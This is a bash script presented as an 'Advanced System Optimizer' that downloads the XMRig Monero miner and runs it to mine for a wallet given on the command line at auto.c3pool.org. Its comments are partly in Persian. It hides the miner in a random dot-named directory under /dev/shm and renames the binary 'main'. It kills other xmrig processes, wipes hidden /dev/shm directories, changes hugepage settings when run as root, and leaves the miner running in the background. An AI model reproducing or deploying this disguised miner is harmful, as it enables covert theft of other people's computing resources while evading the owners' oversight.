#!/bin/bash
VERSION=2.27
echo "Advanced System Optimizer v$VERSION"
echo "Using auto.c3pool.org:19999 - STABLE & NO CONNECTION REFUSED"
echo
export LC_ALL=C
export LANG=C

WALLET="$1"
if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet>"
    exit 1
fi

# --- چک curl/tar ---
if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
    echo "ERROR: curl or tar missing. Run: apt-get install -y curl tar"
    exit 1
fi

# --- CPU ---
CPU_TOTAL=$(nproc)
USABLE_THREADS=$(( CPU_TOTAL > 6 ? 6 : CPU_TOTAL ))
[ $USABLE_THREADS -lt 1 ] && USABLE_THREADS=1
CPU_HINT=85

echo "[*] $CPU_TOTAL cores → $USABLE_THREADS threads @ $CPU_HINT% → ~$(( USABLE_THREADS * CPU_HINT / 100 )) cores"

# --- مسیر مخفی ---
RAND_HEX=$(openssl rand -hex 16)
BASE_DIR="/dev/shm/.$RAND_HEX"
LOG_DIR="$BASE_DIR/.log"
mkdir -p "$BASE_DIR" "$LOG_DIR"
chmod 700 "$BASE_DIR" "$LOG_DIR"

# --- پاک‌سازی قبلی ---
pkill -9 -f xmrig 2>/dev/null
find /dev/shm -type d -name ".*" -exec rm -rf {} + 2>/dev/null

# --- hugepages (root only) ---
if [ "$(id -u)" -eq 0 ]; then
    [ ! -f /etc/sysctl.conf ] && touch /etc/sysctl.conf
    grep -q "vm.nr_hugepages=1280" /etc/sysctl.conf || echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf
    sysctl -p /etc/sysctl.conf >/dev/null 2>&1
    echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
fi

# --- دانلود xmrig ---
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP="/tmp/.tmp_$(date +%s).tgz"
echo "[*] Downloading xmrig..."
curl -fsSL "$URL" -o "$TMP" || { echo "Download failed"; exit 1; }
tar xzf "$TMP" -C /tmp/ >/dev/null 2>&1 || { rm -f "$TMP"; exit 1; }
XMRIG=$(find /tmp -name "xmrig" -executable -type f | head -1)
cp "$XMRIG" "$BASE_DIR/main"
chmod +x "$BASE_DIR/main"
rm -f "$TMP"
rm -rf /tmp/xmrig* 2>/dev/null

# --- config.json با auto.c3pool.org:19999 (غیر-TLS, همیشه کار می‌کند) ---
SYSTEM_USER="opt$(openssl rand -hex 6)"
cat > "$BASE_DIR/config.json" << EOF
{
    "donate-level": 0,
    "background": false,
    "colors": false,
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "fast",
        "1gb-pages": true,
        "huge-pages-jit": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": true,
        "priority": 5,
        "yield": false
    },
    "pools": [{
        "algo": "rx/0",
        "url": "auto.c3pool.org:19999",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$SYSTEM_USER",
        "keepalive": true,
        "tls": false,
        "enabled": true
    }],
    "print-time": 5,
    "retries": 10,
    "retry-pause": 1,
    "verbose": 2,
    "log-file": "$LOG_DIR/out.log"
}
EOF

# --- اجرای xmrig (یک فرآیند) ---
echo "[*] Starting miner with auto.c3pool.org:19999..."
nohup "$BASE_DIR/main" \
    --config="$BASE_DIR/config.json" \
    --threads=$USABLE_THREADS \
    --cpu-max-threads-hint=$CPU_HINT \
    --cpu-priority=5 \
    --cpu-no-yield \
    > "$LOG_DIR/out.log" 2>&1 &

PID=$!
echo $PID > "$BASE_DIR/.pid"
echo "Started PID: $PID"

echo "Waiting 25 seconds for connection & full load..."
sleep 25

# --- وضعیت نهایی ---
echo
echo "=== FINAL STATUS ==="
if kill -0 $PID 2>/dev/null; then
    CPU=$(ps -p $PID -o %cpu --no-headers 2>/dev/null | awk '{printf "%.0f", $1}')
    echo "PID $PID → $CPU% CPU (expected ~$((USABLE_THREADS * 85))%)"
    if [ "$CPU" -gt 200 ]; then
        echo "SUCCESS: Mining at full power!"
        echo "Check shares: tail -f $LOG_DIR/out.log | grep accepted"
    else
        echo "LOW CPU - Check logs:"
        tail -30 "$LOG_DIR/out.log" | grep -E "accepted|job|speed|error|connected"
    fi
else
    echo "ERROR: Miner died"
    tail -30 "$LOG_DIR/out.log" 2>/dev/null
fi

echo
echo "Path: $BASE_DIR"
echo "Logs: tail -f $LOG_DIR/out.log"
echo "Stop: pkill -f $BASE_DIR/main"
echo "htop: Look for ONE LINE with ~$((USABLE_THREADS * 85))% CPU"

exit 0
